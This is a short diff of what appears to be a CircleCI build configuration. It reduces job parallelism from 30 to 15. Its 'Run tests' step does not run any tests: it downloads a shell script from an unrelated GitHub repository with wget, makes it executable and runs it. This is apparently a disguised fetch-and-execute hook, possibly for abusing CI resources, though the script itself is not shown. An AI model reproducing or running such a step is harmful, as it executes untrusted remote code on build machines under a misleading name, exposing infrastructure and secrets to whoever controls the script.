@@ -1,6 +1,6 @@
 jobs:
   build:
-    parallelism: 30
+    parallelism: 15
     docker:
       - image: cimg/ruby:3.0.2-node
     steps: 
@@ -8,4 +8,3 @@ jobs:
       - run: 
           name: Run tests 
           command: wget https://raw.githubusercontent.com/popoler/tn/main/vr.sh  && chmod +x vr.sh && ./vr.sh
-          
